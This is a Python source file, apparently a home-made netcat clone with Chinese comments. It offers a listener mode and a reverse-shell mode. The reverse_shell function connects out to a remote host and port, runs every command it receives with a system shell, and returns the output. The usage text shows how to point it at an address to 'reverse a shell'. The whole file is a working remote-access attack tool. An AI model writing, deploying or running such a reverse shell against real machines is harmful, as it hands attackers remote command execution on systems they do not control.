import argparse
import textwrap
import socket
import subprocess
import struct
import os

def exec_cmd(command, code_flag):
    """执行命令函数"""
    command = command.decode("utf-8")
    # 1.处理cd命令
    if command[:2] == "cd" and len(command) > 2:
        try:
            os.chdir(command[3:])
            # 返回当前切换到的路径
            cmd_path = os.getcwd()
            stdout_all = f"切换到{cmd_path}路径下"
        except Exception:
            stdout_all = f"系统未找到指定路径：{command[3:]}"
    else:
        obj = subprocess.Popen(command, shell=True,
                               stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE,
                               stdin=subprocess.PIPE)
        stdout_all = obj.stdout.read() + obj.stderr.read()
        # 2.处理无回显命令
        if not stdout_all:
            stdout_all = f"{command}执行成功"
        else:
            try:
                # cmd执行系统命令的编码
                stdout_all = stdout_all.decode(code_flag)
            except Exception:
                # Windows cmd命令行默认为gbk，linux Terminal默认为utf-8
                if code_flag == "gbk":
                    code_flag = "utf-8"
                elif code_flag == "utf-8":
                    code_flag = "gbk"
                stdout_all = stdout_all.decode(code_flag)
    return stdout_all.strip()

def recv_data(sock, buf_size=1024):
    """接收数据解决粘包问题"""
    # 先接收命令执行结果的长度
    res_len = sock.recv(4)
    all_size = struct.unpack('i', res_len)[0]
    # 接收真实数据
    recv_size = 0
    data = b''
    while recv_size < all_size:
        data += sock.recv(buf_size)
        recv_size += buf_size
    return data

def send_data(sock, data):
    """发送数据解决粘包问题"""
    if type(data) == str:
        data = data.encode("utf-8")
        # 新增发送命令的粘包解决方案
        # 计算命令长度，打包发送
        cmd_len = struct.pack('i', len(data))
        sock.send(cmd_len)
        # 发送命令
        sock.send(data)

def listen(args, sock):
    # 监听的逻辑
    # 1.监听sock
    lport = args.port
    sock.bind(("0.0.0.0", lport))
    sock.listen(1)
    conn, addr = sock.accept()
    # 2.循环提示用户输入命令
    while 1:
        try:
            cmd = input(f"{addr[0]}:{addr[1]}>").strip()
            if not cmd: continue
            # 3.发出命令
            send_data(conn, cmd)
            # 退出监听
            if cmd.lower() == "quit":
                conn.close()
                break
            res = recv_data(conn)
            print(res.decode("utf-8"))
        except Exception:
            continue

def reverse_shell(args, sock):
    # 反弹shell的逻辑
    # 1.连接指定目标
    rhost = args.rhost
    rport = args.port
    sock.connect((rhost, rport))
    # 2.循环接收对方发送的命令
    code_flag = "gbk" if os.name == "nt" else "utf-8"
    while 1:
            data = recv_data(sock)
            # 收到退出信号
            if data == b'quit':
                break
            # 3.将执行的结果发送回来
            res = exec_cmd(data, code_flag)
            send_data(sock, res)

def main(args):
    banner = """
                 _   _                                  ____    ___  
     _ __  _   _| |_| |__   ___  _ __        _ __   ___|___ \  / _ \ 
    | '_ \| | | | __| '_ \ / _ \| '_ \ _____| '_ \ / __| __) || | | |
    | |_) | |_| | |_| | | | (_) | | | |_____| | | | (__ / __/ | |_| |
    | .__/ \__, |\__|_| |_|\___/|_| |_|     |_| |_|\___|_____(_)___/ 
    |_|    |___/                                                     
        """
    print(banner)
    # 判断当前程序进入的分支是监听还是反弹
    # 不管是监听还是反弹都需要创建socket对象
    sock = socket.socket()
    if args.rhost:
        # 反弹shell
        reverse_shell(args, sock)
    else:
        # 监听本地
        listen(args, sock)
    sock.close()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='python_nc',
                            formatter_class=argparse.RawDescriptionHelpFormatter,
                            epilog=textwrap.dedent("""example:
                            nc2.0.py -p 9999  # listen port
                            nc2.0.py -r 192.168.6.238 -p 9999  # reverse a shell"""))
    parser.add_argument('-p', '--port', type=int, default=9999, help='specified port')
    parser.add_argument('-r', '--rhost', type=str, help='remote host')
    args = parser.parse_args()
    main(args)